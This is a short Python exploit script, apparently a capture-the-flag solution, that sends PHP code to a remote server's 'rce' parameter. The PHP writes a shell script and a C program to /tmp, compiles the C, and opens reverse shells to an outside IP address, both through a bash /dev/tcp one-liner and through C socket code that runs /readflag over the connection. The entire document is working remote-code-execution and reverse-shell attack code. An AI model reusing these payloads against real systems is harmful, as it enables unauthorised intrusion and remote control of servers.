# by junorouse
from requests import post
from pwn import *

url = 'http://localhost:7989';
url = 'http://52.53.55.151:11514/';

payload_leak = '''
file_put_contents("/tmp/junobb.c",  $_POST['code']);
file_put_contents("/tmp/junox",  $_POST['data']);

chmod("/tmp/junox", 0777);
// echo file_get_contents("/tmp/junox");

echo file_get_contents("/tmp/meow1234");

''';

yes = '''#!/bin/sh
gcc -o /tmp/junobb /tmp/junobb.c
ls -al /etc/passwd > /tmp/meow1234

which gcc >> /tmp/meow1234
ls -al /tmp/junobb >> /tmp/meow1234

echo "1234" | /tmp/junobb >> /tmp/meow1234
/bin/bash -i >& /dev/tcp/13.209.57.159/80 0>&1


sleep 1;
'''

yes2 = '''#include <stdio.h>
#include <unistd.h>
#include <signal.h>
#include<stdlib.h>
#include <stdio.h>
#include<string.h>
#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <signal.h>

#define REMOTE_ADDR "13.209.57.159"
#define REMOTE_PORT 80

int main()
{
        sigignore(SIGALRM);
        struct sockaddr_in sa;
        int s;

        sa.sin_family = AF_INET;
        sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
        sa.sin_port = htons(REMOTE_PORT);

        s = socket(AF_INET, SOCK_STREAM, 0);
        connect(s, (struct sockaddr *)&sa, sizeof(sa));

        dup2(s, 0);
        dup2(s, 1);
        dup2(s, 2);
        execve("/readflag", 0, 0);
        // system("/readflag");
}
'''

c = post(url, data={'rce': payload_leak, 'data': yes, 'code': yes2}, headers={'Content-Type': 'application/x-www-form-urlencoded'});
print c.text
